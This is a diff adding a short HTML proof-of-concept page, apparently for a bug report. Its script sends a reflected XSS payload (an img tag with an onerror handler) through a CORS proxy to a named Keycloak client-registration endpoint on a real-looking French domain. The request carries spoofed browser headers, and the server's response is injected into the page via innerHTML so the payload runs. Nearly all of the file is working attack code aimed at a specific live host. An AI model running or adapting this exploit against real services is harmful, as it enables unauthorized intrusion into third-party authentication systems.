@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>XSS Vulnerability Demo</title>
+    <script>
+        function triggerXSS() {
+            const proxyUrl = '/proxy/';
+            const targetUrl = 'https://sso.sf.adias.fr/auth/realms/master/clients-registrations/openid-connect';
+            const url = proxyUrl + targetUrl;
+            const payload = {
+                "<img onerror=confirm(1337) src/>": 1
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Cache-Control': 'max-age=0',
+                    'Sec-Ch-Ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
+                    'Sec-Ch-Ua-Mobile': '?0',
+                    'Sec-Ch-Ua-Platform': '"Windows"',
+                    'Upgrade-Insecure-Requests': '1',
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36',
+                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+                    'Sec-Fetch-Site': 'none',
+                    'Sec-Fetch-Mode': 'navigate',
+                    'Sec-Fetch-User': '?1',
+                    'Sec-Fetch-Dest': 'document',
+                    'Accept-Encoding': 'gzip, deflate, br',
+                    'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7',
+                    'Priority': 'u=0, i'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => response.text())
+            .then(data => {
+                // Display the response for debugging
+                document.getElementById('output').innerHTML = data;
+            })
+            .catch(error => console.error('Error:', error));
+        }
+    </script>
+</head>
+<body>
+    <h2>XSS Vulnerability Test</h2>
+    <button onclick="triggerXSS()">Trigger XSS</button>
+    <div id="output"></div>
+    <p>Click the button above to send the XSS payload to the server through a CORS proxy. Check the response for XSS execution.</p>
+</body>
+</html>
